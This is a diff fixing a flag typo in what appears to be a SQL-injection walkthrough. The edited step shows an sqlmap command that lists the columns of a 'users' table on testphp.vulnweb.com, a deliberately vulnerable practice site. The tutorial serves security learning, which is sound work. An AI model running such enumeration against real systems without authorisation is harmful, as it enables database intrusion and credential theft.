@@ -27,7 +27,7 @@ Then, I ran the command `sqlmap -u 'testphp.vulnweb.com/artists.php?artist=1' -D
 
 
 ### Step 5: Focus on Specific Tables
-We will focus on the _users_ table by running the command `sqlmap -u 'testphp.vulnweb.com/artists.php?artist=1' --D acuart -T users columns`. This command will show us all the columns in this table.
+We will focus on the _users_ table by running the command `sqlmap -u 'testphp.vulnweb.com/artists.php?artist=1' -D acuart -T users columns`. This command will show us all the columns in this table.
 <img width="1440" alt="Screenshot 2022-11-05 at 2 08 13 AM" src="https://user-images.githubusercontent.com/64619851/200082229-e0501387-5c22-4928-b34d-aab500c11bc7.png">
 
 
